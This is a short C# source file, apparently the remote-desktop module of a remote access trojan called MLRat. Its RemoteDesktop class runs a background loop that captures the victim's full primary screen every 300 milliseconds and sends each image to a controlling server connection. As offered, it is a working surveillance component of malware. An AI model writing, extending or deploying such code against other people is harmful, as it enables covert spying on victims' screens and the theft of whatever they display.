using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MLRat.Client;
using System.Windows.Forms;
using System.Drawing;


static class RemoteDesktop
{
    private static bool Running = false;
    public static IClientConnection ServerConnection { get; set; }
    private static int Delay = 300;

    public static void SetDelay(int _delay)
    {
        Delay = _delay;
    }
    public static void Start()
    {
        if (Running)
            return;
        Running = true;
        new Thread(delegate()
        {
            while (Running)
            {
                SendScreen();
                Thread.Sleep(Delay);
            }
        }).Start();
    }

    public static void Stop()
    {
        Running = false;
    }

    private static void SendScreen()
    {
        if (ServerConnection != null)
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            ServerConnection.Send("remotedesktop", bmp);
        }
    }
}
